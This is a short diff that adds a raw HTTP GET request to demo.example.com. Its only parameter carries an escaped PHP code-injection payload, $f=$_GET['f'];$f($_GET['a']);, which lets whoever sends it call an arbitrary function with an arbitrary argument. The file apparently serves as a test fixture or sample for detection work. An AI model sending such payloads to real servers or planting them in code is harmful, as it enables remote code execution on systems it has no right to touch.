@@ -1,0 +1,4 @@
+GET /a?input=$f%3D$_GET[\u0027f\u0027]\u003B$f($_GET[\u0027a\u0027])\u003B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
